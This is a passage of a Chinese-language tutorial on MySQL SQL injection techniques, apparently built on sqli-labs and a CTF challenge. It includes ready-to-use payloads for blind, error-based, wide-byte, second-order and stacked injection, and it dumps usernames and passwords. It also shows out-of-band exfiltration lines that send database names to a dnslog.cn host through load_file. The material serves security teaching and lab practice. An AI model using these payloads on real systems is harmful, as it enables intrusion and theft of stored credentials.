+<h4 id="获取列中有多少行记录"><a href="#获取列中有多少行记录" class="headerlink" title="获取列中有多少行记录"></a>获取列中有多少行记录</h4><p>count</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select count(user) from users)=5%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719473727347-d09fe43f-8d5c-4ea3-8b5f-faa7ff44dfd4.png"></p>
+<h4 id="获取记录长度"><a href="#获取记录长度" class="headerlink" title="获取记录长度"></a>获取记录长度</h4><p>limit</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select length(user) from users limit 0,1)=5%23</span><br><span class="line">或</span><br><span class="line">?id=1&#x27; and length((select user from users limit 0,1))=5%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719473891522-236e5182-f45e-472e-a605-0aa0b76d18e6.png" alt="改变limit的第一个参数（0-4）可以得出五行数据各有多长"></p>
+<h4 id="获取具体数据"><a href="#获取具体数据" class="headerlink" title="获取具体数据"></a>获取具体数据</h4><p>users表中的user列中五行数据中第一行数据长度为5，求出具体数据内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select user from users limit 0,1),1,1)=&#x27;a&#x27;%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719474208970-e57f66dc-cfa8-453b-a920-4ed40076c546.png" alt="改变str的第二个参数可以得出该行的所有数据（1-5）"></p>
+<p>改变limit的第一个参数可以改变所要求的行数（0-4）</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>不管用户输入什么，网站都没有正确或者错误的页面回显，利用页面的响应时间来判断sql语句有没有执行</p>
+<h3 id="时间盲注函数"><a href="#时间盲注函数" class="headerlink" title="时间盲注函数"></a>时间盲注函数</h3><p>sleep()</p>
+<p>benchmark(N,exp)（N为次数，exp为执行语句，将一个语句执行很多次从而达到时间盲注效果，N通常很大，比如500000000）</p>
+<h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><ol>
+<li>判断是否存在注入</li>
+<li>获取数据库长度</li>
+<li>逐字猜解数据库名</li>
+<li>猜解表名数量</li>
+<li>猜解某个表名长度</li>
+<li>逐字猜解表名</li>
+<li>猜解列名数量</li>
+<li>猜解某个列名长度</li>
+<li>逐字猜解列名</li>
+<li>判断数据数量</li>
+<li>猜解某条数据长度</li>
+<li>逐位猜解数据</li>
+</ol>
+<h3 id="判断是否存在注入-2"><a href="#判断是否存在注入-2" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p><code>sleep()</code>函数，当使用sleep()函数时，观察页面响应时间</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and sleep(3)</span><br><span class="line">1&#x27; and sleep(3)%23</span><br></pre></td></tr></table></figure>
+
+<p>如果sleep生效，则说明存在sql注入</p>
+<h3 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><h4 id="获取数据库名长度-1"><a href="#获取数据库名长度-1" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h4><p><code>if(expr1,expr2,expr3)</code>第一个条件成立就执行expr2，否则执行expr3（三元表达式）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and if(length(database())=8,sleep(3),1)%23</span><br><span class="line">页面延迟，8就为database的长度</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719485844545-cf099b1c-8da1-49ec-a29e-f78955874758.png" alt="这个就是成功延时的结果"></p>
+<p>其他的步骤和布尔盲注相同，只需要把布尔盲注的语句填入if中的第一个参数即可</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>页面上没有显示位，但是会输出SQL语句执行错误的信息</p>
+<p>人为制造错误条件，使得查询结果能够出现在错误信息中</p>
+<p>适用于联合查询受阻，后台没有屏蔽数据库报错信息，发生错误时会输出错误信息到前端页面</p>
+<p>有的布尔盲注也可以用报错注入</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>开发人员使用了<code>print_r()</code>、<code>mysql_error()</code>、<code>mysqli_connect_error()</code>函数将mysql错误信息输出到前端，因此可以人为地使用一些指定的函数来制造报错信息，从而获取报错信息中特定的信息</p>
+<p>使用常规的union联合查询注入可以发现时无法注出数据的，用盲注又太费时费力，所以可以结合页面的报错信息使用报错注入。</p>
+<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>从mysql5.1.5开始提供两个用于XML查询和修改的函数，通过XML函数进行报错，来进行注入。</p>
+<ol>
+<li>undatexml()</li>
+</ol>
+<p>语法：updatexml(XML_document，XPath_srting，new_value)参数1：xml文档的名称；参数2：xpath格式的字符串；参数3：替换查找到的符合条件的数据</p>
+<ol start="2">
+<li>extractvalue()</li>
+</ol>
+<p>语法：extractvalue(xml_frag，xpath_expr)第一个参数：目标xml文档；第二个参数：xpath路径法表示的查找路径</p>
+<blockquote>
+<p>Xpath定位必须是有效的，否则会发生错误，我们可以利用这个特性爆出我们想要的数据</p>
+</blockquote>
+<blockquote>
+<p>注意！！！</p>
+<ol>
+<li>必须是在xpath那里传特殊字符，mysql才会报错，特殊字符可以使用<code>~</code>的16进制<code>0x7e</code>来表示。</li>
+<li>path是一个位置，用了特殊字符就不能再添加参数，所以可以用<code>concat()</code>函数将<code>~</code>和自己想注出的数据进行拼接。concat(str1,str2,str3,)：把str1,str2,str3等字符串无缝拼接起来。</li>
+<li>path只会报错32个字符。（回显是32位，我们在获取表名或列名的时候可以获取，但有时数据太大，我们无法得到所有的内容）</li>
+</ol>
+</blockquote>
+<h2 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="判断是否存在注入，注入类型"><a href="#判断是否存在注入，注入类型" class="headerlink" title="判断是否存在注入，注入类型"></a>判断是否存在注入，注入类型</h3><p>方式和联合查询注入、盲注一样</p>
+<p>输入<code>1</code>和<code>1&#39;</code>，如果输入1页面正常显示，输入1’页面有报错，则说明很有可能存在注入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719655826513-138a4a8b-80f0-4d8a-9d9b-874fc40fc37f.png"></p>
+<p>再使用<code>1 and 1=1</code>、<code>1 and 1=2</code>、<code>1&#39; and &#39;1&#39;=&#39;1</code>、<code>1&#39; and &#39;1&#39;=&#39;2</code>来判断注入类型（同样与盲注测试方式一样）</p>
+<h3 id="获取数据库名-3"><a href="#获取数据库名-3" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><p>获取数据库名的意义：src漏洞挖掘、项目，数据库名算敏感信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,database()),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719659409304-6a0b1374-22d9-4a21-aa8f-ba38f9126580.png"></p>
+<p>原因</p>
+<ol>
+<li>首先回到语法格式上：updatexml(XML_document,XPath_string,new_value)，我们必须在XPath_string：这个参数里填充xpath格式的字符串，但是如果我们填充一个不是xpath格式的字符串，就会产生报错，所以语句就变成了updatexml(1,database(),1)，前后两个1是随便填充的内容，目的是满足三个参数。</li>
+<li>由于xpath只会对特殊字符进行报错，这里我们可以用~的16进制<code>0x7e</code>来表示，所以就变成了updatexml(1,0x7e,database(),1)，但是由于数据库无法认识中间的内容，所以就无法成功执行，所以可以用concat()函数把多个字符串合并成一个，就变成了updatexml(1,concat(0x7e,database()),1)</li>
+</ol>
+<h3 id="获取数据库中表名"><a href="#获取数据库中表名" class="headerlink" title="获取数据库中表名"></a>获取数据库中表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">更改updatexml中的xpath参数的concat函数中的第二个参数内容</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;)),1)%23</span><br><span class="line"></span><br><span class="line">里面的select语句加（）的原因是：concat函数不允许里面有空格，要用括号使里面的查询为一个整体</span><br></pre></td></tr></table></figure>
+
+<h4 id="遇见问题"><a href="#遇见问题" class="headerlink" title="遇见问题"></a>遇见问题</h4><table>
+<thead>
+<tr>
+<th>问题描述</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Subquery returns more than 1 row<br/>子查询返回多于一行</td>
+<td>1. 使用limit()（修改limit第一个参数以至于获取每一行）<br/><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719661086870-15a454a3-187d-4be6-a60c-504345758e41.png"><br/>2. 使用group_concat()<br/><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719661030846-ddcd6e11-f3a2-47a1-8895-683fedb41e2b.png"></td>
+</tr>
+<tr>
+<td>数据库中的表更多，内容字段和大于32位，导致无法一次性显示出来</td>
+<td>使用substr()截取<br/>先截取前32位，再截取后32位，分步获取<br/>1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)),1,32),1)%23</td>
+</tr>
+</tbody></table>
+<h3 id="获取表中字段名"><a href="#获取表中字段名" class="headerlink" title="获取表中字段名"></a>获取表中字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719661869141-a7ce4ceb-2bd7-4d71-a07b-17fc28269013.png"></p>
+<h3 id="获取表中记录"><a href="#获取表中记录" class="headerlink" title="获取表中记录"></a>获取表中记录</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users)),1)%23</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from users),1,32)),1)%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719671478707-f1b009d0-c198-4ad1-b945-94b8cde0bc58.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719671310732-49ae184c-d00b-4692-8d66-cc1f42aaa8f2.png" alt="先看前32位"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719671343487-5c637e32-c21f-4183-ad3f-429a0ed84088.png" alt="再看从32位开始往后32位的字符，以此类推"></p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><blockquote>
+<p>是一种绕过方式</p>
+</blockquote>
+<p>一个字符的大小是一个字节-&gt;窄字节</p>
+<p>一个字符的大小是两个字节-&gt;宽字节</p>
+<p>像GB2321、GBK、GB18030、B1G5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两个字节。</p>
+<p>英文默认占一个字节，中文占两个字节</p>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>网站对SQL注入做了防护，例如使用一些MySQL中的转义函数addslashes、mysql_real_escape_string、mysql_escape_string、等（还有一种是php配置文件的magic_quote_gpc设置，不过php高版本已经移除此功能）。这些函数就是过滤用户输入的一些数据，对特殊字符加上反斜杠<code>\</code>进行转义。</p>
+<p>可以使用宽字节注入绕过<code>\</code>转义</p>
+<p>宽字节注入指的是MySQL数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入<code>&#39;</code>时，MySQL会调用转义函数，将单引号变为<code>\&#39;</code>，其中<code>\</code>的十六进制是5c,，MySQL的GBK编码，会认为<code>%df%5c</code>是一个宽字节，也就是<code>運</code>，从而使单引号闭合（逃逸），进行注入攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27===&gt;(addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;運’</span><br><span class="line">//输入%df&#x27;===&gt;经过addslashes函数进行转义====&gt;转义为%df%5c%27====&gt;经过(GBK)编码====&gt;变成 運&#x27;</span><br><span class="line">用户输入==&gt;过滤函数==&gt;代码层的$sql==&gt;mysql处理请求==&gt;mysql中的sql</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>当mysql_query(“SET NAMES gbk”)在代码层被写入时，三个字符集（客户端、连接层、结果集）都是GBK编码</p>
+</blockquote>
+<h2 id="注入流程-3"><a href="#注入流程-3" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="判断注入"><a href="#判断注入" class="headerlink" title="判断注入"></a>判断注入</h3><ol>
+<li>输入<code>1&#39;</code>，addslashes函数将<code>&#39;</code>转义为<code>\&#39;</code></li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719673635068-db75f835-c434-4c68-9cb5-c2eda37ec543.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%df&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>输入1%df’，此时转义后%df%5c结合形成一个汉字，查询成功而引起报错，说明存在注入</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719673758734-25510b58-d3c9-4e5f-ac32-d1a258e7d265.png"></p>
+<ol start="3">
+<li>结尾添加注释使单引号闭合，按照正常方法注入即可</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%df&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719673855219-c6ab440b-3fba-4246-9eef-2980055a6a5e.png"></p>
+<h3 id="注入（使用联合查询注入）"><a href="#注入（使用联合查询注入）" class="headerlink" title="注入（使用联合查询注入）"></a>注入（使用联合查询注入）</h3><p>步骤和正常注入一样：</p>
+<p>获取字段数、确定显示位、注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,database() --+</span><br><span class="line">//查看数据库名</span><br></pre></td></tr></table></figure>
+
+<p>表名和列名要用<code>&#39;</code>引起来，该怎么注入？</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719674665669-170d2be9-2885-4049-a4ca-5242727b94e4.png"></p>
+<p>不能直接在单引号前面再加上%df，同样会使查询内容改变，查询错误</p>
+<p><strong>使用十六进制（HEX）编码</strong></p>
+<p>将我们需要单引号引起来的内容（数据库名、表名、列名）进行十六进制编码，并再编码后前面加上0x</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719674966508-c6418feb-07f5-4830-ade2-b428923e66de.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719674956141-88bec04a-1788-4523-bf0f-bdc6be9e880d.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719675032910-3e1f6b60-8fac-4bd1-8550-bdbc8b9d0978.png" alt="使用group_concat"></p>
+<blockquote>
+<p>不是所有情况下的表名列名都要用HEX编码（是只有单引号引起来的需要）！</p>
+</blockquote>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>黑盒思路：分析功能有添加后对数据操作的地方（功能点）（很难测出，sql语句的符号影响，转义不能直接看出，容错处理代码中是否有，找到在哪里触发（执行置入的sql语句））</p>
+<p>白盒思路：insert后进入select或update的功能的代码块（源代码去审）</p>
+<p>注入条件：插入时有转义函数或配置，后续有利用插入的数据（先插入后利用）</p>
+<blockquote>
+<p>有转义函数，（’转义为 &#39;）数据才能正常写入，才能二次注入</p>
+<h5 id="实现二次注入，源码中有对应的转义（magic-quotes-gpc（魔术引号转义））或使用转义函数（addslashes）"><a href="#实现二次注入，源码中有对应的转义（magic-quotes-gpc（魔术引号转义））或使用转义函数（addslashes）" class="headerlink" title="实现二次注入，源码中有对应的转义（&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;magic_quotes_gpc（魔术引号转义）&lt;/font&gt;）或使用转义函数（&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;addslashes&lt;/font&gt;）"></a><font style="color:rgb(79, 79, 79);">实现二次注入，</font><font style="background-color:rgba(255, 255, 255, 0);">源码中有</font><strong><font style="background-color:rgba(255, 255, 255, 0);">对应的转义（</font></strong><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;magic_quotes_gpc（魔术引号转义）&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">）或使用转义函数（</font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;addslashes&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">）</font></h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732003997510-027cfa63-fb33-4410-be38-8665228ea66d.png"></p>
+</blockquote>
+<p>原理：</p>
+<p>注册新用户时，将注入的内容包含在注册的用户名后：</p>
+<p>admin’ and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)#</p>
+<p>成功注入，并查看数据库，数据库中也存放了响应的注入语句</p>
+<p>正常登录：登陆后，随便输入旧密码和新密码，点击修改后，由于在登录状态下修改密码时，使用了update的sql语法，将我们的用户名带入查询，触发了注入，发现注入成功，错误回显版本号</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45663905/article/details/107684251">二次注入——sqli-labs第24关_sqlilabs第24关-CSDN博客</a></p>
+<p>一共三个页面：登录页面、注册页面、忘记密码页面</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719928292834-ec5f8760-84c3-41c1-a045-c2bc0f94d5a1.png"></p>
+<p>看到这里我们可以思考有什么可以注入的地方，在修改密码的时候会带入查询，</p>
+<p>我们先注册一个用户admin’#（为闭合做准备）</p>
+<p>登录后，修改他的密码，我们这里原密码为123546，修改为111111</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719929120461-1784c0eb-0f0b-4285-8209-657c53e88a5a.png"></p>
+<p>回显 显示修改成功</p>
+<p>此时修改的是admin的密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719929214008-467b344f-5836-40ee-8a29-a2fa10e453ba.png"></p>
+<p>原因就是当我们在修改密码时带入的查询，在修改的用户名处进行了注入，我们的用户名admin’#经过单引号闭合和注释变成了admin，我们修改的就为admin的密码</p>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句，</p>
+<p>例如php中的mysqli_multi_query函数。与之相对应的mysqli_query()只能执行一条SQL，所以要想目标存在堆叠注入，在目标主机存在类似于mysqli_multi_query()这样的函数,根据数据库类型决定是否支持多条语句执行.</p>
+<blockquote>
+<p>简单来讲就是如果使用mysqli_query()则不存在堆叠注入，如果使用mysqli_multi_query()则存在堆叠注入</p>
+</blockquote>
+<p>支持堆叠数据库：MYSQL MSSQL Postgresql等</p>
+<p>条件：</p>
+<p>1.存在sql注入</p>
+<p>2.未对;进行过滤</p>
+<p>3.使用了mysqli_multi_query()</p>
+<p>使用：</p>
+<p>id&#x3D;1;CREATE TABLE xxx(test VARCHAR(255))，在传参之后加;后面可以直接写第二条sql语句让他一起执行</p>
+<p><font style="background-color:rgba(255, 255, 255, 0);"></font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">2019强网杯-随便注（CTF题型）</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">‘;show databases;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;show tables;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;show columns from </font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;</code>1919810931114514<code>&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;select flag from </font><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;</code>1919810931114514<code>&lt;/font&gt;</code><font style="background-color:rgba(255, 255, 255, 0);">;<br></font><font style="background-color:rgba(255, 255, 255, 0);">‘;SeT @a&#x3D;0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;<br></font></p>
+<p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;show databases;&lt;/font&gt;</code></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">这似乎是尝试显示数据库</font></p>
+<p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;show tables;&lt;/font&gt;</code></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">类似于第一个，似乎是尝试显示表。</font></p>
+<p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;show columns from 1919810931114514;&lt;/font&gt;</code></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">另一次尝试从具有特定名称的表中显示列。</font></p>
+<p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;select flag from 1919810931114514;&lt;/font&gt;</code></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">类似于前一个，试图从表中选择名为’flag’的列。确保表和列存在。</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">由于提示不能使用select等，所以使用动态SQL语句，</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">将想要执行的语句，转换为</font><font style="background-color:rgba(255, 255, 255, 0);">Hex（16 进制）</font></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732007082017-36540a59-d481-4584-98e5-73977b287f06.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1732007081987-93b2937e-218e-464e-9c6e-c27869468970.png"></p>
+<p><code>&lt;font style=&quot;background-color:rgba(255, 255, 255, 0);&quot;&gt;&#39;;SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;&lt;/font&gt;</code></p>
+<h1 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h1><p>产生原因：</p>
+<p>有部分注入点是没有回显的，所有读取也是没回显的，采用带外的形式，回显数据</p>
+<p>注入条件：</p>
+<p>ROOT高权限且支持load_file()</p>
+<blockquote>
+<p>secure-file-priv开启（支持load_file()）</p>
+</blockquote>
+<blockquote>
+<p>条件太苛刻了， 而且已经有root权限，且能够load_file()，直接写文件写马进去了</p>
+</blockquote>
+<p>使用：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&#x27;\\\\&#x27;</span>,(select <span class="title function_ invoke__">database</span>()),<span class="string">&#x27;.7logee.dnslog.cn\\aa&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>在注入点：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">load_file</span>(<span class="title function_ invoke__">concat</span>(<span class="string">&quot;\\\\&quot;</span>,<span class="title function_ invoke__">database</span>(),<span class="string">&quot;.7logee.dnslog.cn\\asdt&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>在dnslog平台观察回显</p>
+<h1 id="常见过滤和绕过"><a href="#常见过滤和绕过" class="headerlink" title="常见过滤和绕过"></a>常见过滤和绕过</h1><h2 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h2><p>select等关键字被过滤</p>
